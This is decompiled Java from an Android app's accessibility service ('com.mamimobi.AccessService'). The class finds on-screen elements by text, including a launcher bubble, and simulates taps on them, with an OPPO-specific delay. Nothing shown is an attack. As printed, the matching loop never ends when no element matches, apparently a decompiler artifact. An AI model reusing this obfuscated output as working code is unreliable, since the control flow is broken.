package defpackage;

import android.graphics.Rect;
import android.os.Build;
import android.view.accessibility.AccessibilityNodeInfo;
import com.mamimobi.AccessService;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class r1 implements Runnable {
    public final /* synthetic */ int E;
    public final /* synthetic */ AccessService F;
    public final /* synthetic */ AccessibilityNodeInfo G;

    public /* synthetic */ r1(AccessService accessService, AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        this.E = i;
        this.F = accessService;
        this.G = accessibilityNodeInfo;
    }

    @Override // java.lang.Runnable
    public final void run() {
        AccessibilityNodeInfo accessibilityNodeInfo = this.G;
        AccessService accessService = this.F;
        switch (this.E) {
            case 0:
                String str = AccessService.V;
                accessService.getClass();
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(la0.b);
                if (!listFindAccessibilityNodeInfosByText.isEmpty()) {
                    Rect rect = new Rect();
                    if (listFindAccessibilityNodeInfosByText.size() == 1) {
                        listFindAccessibilityNodeInfosByText.get(0).getBoundsInScreen(rect);
                    } else {
                        Iterator<AccessibilityNodeInfo> it = listFindAccessibilityNodeInfosByText.iterator();
                        while (true) {
                            if (it.hasNext()) {
                                AccessibilityNodeInfo next = it.next();
                                if (next.getViewIdResourceName() != null && next.getViewIdResourceName().equalsIgnoreCase("com.android.launcher:id/bubble_text")) {
                                    next.getBoundsInScreen(rect);
                                }
                            }
                        }
                    }
                    d91.a(accessService, (rect.left + rect.right) / 2, (rect.top + rect.bottom) / 2);
                    if (Build.MANUFACTURER.equalsIgnoreCase("OPPO")) {
                        AccessService.a1.postDelayed(new k1(accessService, 3), 300L);
                    }
                }
                break;
            default:
                AccessibilityNodeInfo rootInActiveWindow = AccessService.e0.getRootInActiveWindow();
                AtomicBoolean atomicBoolean = d91.a;
                if (rootInActiveWindow == null) {
                    Rect rect2 = new Rect();
                    accessibilityNodeInfo.getBoundsInScreen(rect2);
                    int i = (rect2.left + rect2.right) / 2;
                    int iC = (int) (rect2.bottom - (d91.c(52.0f) / 2.0f));
                    atomicBoolean.set(false);
                    d91.a(accessService, i, iC);
                } else {
                    Rect rect3 = new Rect();
                    rootInActiveWindow.getBoundsInScreen(rect3);
                    int i2 = (rect3.left + rect3.right) / 2;
                    int iC2 = (int) (rect3.bottom - (d91.c(52.0f) / 2.0f));
                    atomicBoolean.set(false);
                    d91.a(accessService, i2, iC2);
                }
                break;
        }
    }
}
